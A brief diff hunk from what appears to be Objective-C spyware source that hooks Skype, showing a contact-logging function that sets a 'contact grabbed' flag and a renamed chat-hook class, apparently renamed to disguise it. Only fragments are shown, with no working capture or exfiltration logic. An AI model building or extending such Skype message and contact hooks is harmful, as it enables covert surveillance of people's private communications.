@@ -124,7 +124,7 @@ void logSkypeContacts(NSString *contact)
   gSkypeContactGrabbed = TRUE;
 }
 
-@implementation mySkypeChat
+@implementation __m_mySkypeChat
 
 - (BOOL)isMessageRecentlyDisplayedHook: (uint)arg1
 { 
